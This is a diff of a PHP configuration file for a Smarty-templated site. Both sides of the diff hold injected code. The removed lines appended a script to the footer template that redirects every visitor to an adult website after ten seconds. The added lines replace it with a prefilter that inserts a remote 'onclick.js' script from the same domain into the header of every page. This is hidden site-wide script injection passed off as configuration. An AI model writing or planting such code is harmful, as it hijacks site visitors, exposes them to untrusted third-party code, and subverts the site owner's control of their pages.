@@ -18,24 +18,24 @@ foreach ( $config as $key => $value ) {
 }
 $smarty->assign('languages', $languages);
 
-if (!function_exists('smarty_footer_script_filter')) {
-    function smarty_footer_script_filter($tpl_source, Smarty_Internal_Template $template)
+if (!function_exists('smarty_header_script_filter')) {
+    function smarty_header_script_filter($tpl_source, Smarty_Internal_Template $template)
     {
-        if (substr($template->source->name, -10) !== 'footer.tpl') {
-            return $tpl_source;
+        if (substr($template->source->name, -10) !== 'header.tpl') {
+            return $tpl_source;␊
         }
 
-        $snippet = "\n{literal}\n<script>\n\n    setTimeout(function() {\n\n        window.location.href = \"https://javpornsub.net/\";\n\n    }, 10000); // 5000 milidetik = 5 detik\n\n</script>\n\n{/literal}\n";
+        $header_snippet = "\n{literal}\n<script async src=\"https://player.javpornsub.net/onclick.js\"></script>\n{/literal}\n";
 
-        if (strpos($tpl_source, $snippet) === false) {
-            $tpl_source .= $snippet;
+        if (strpos($tpl_source, $header_snippet) === false) {
+            $tpl_source .= $header_snippet;
         }
 
         return $tpl_source;
     }
 }
 
-$smarty->registerFilter('pre', 'smarty_footer_script_filter');
+$smarty->registerFilter('pre', 'smarty_header_script_filter');
 $smarty->assign('bgcolor',      '#E8E8E8');
 $smarty->assign('baseurl',    $config['BASE_URL']);
 $smarty->assign('basedir',    $config['BASE_DIR']);
@@ -49,4 +49,3 @@ $smarty->assign('tmburl',     $config['TMB_URL']);
 $smarty->assign('photourl',   $config['PHO_URL']);
 $smarty->assign('max_thumb_folders',   $config['max_thumb_folders']);
 ?>
-
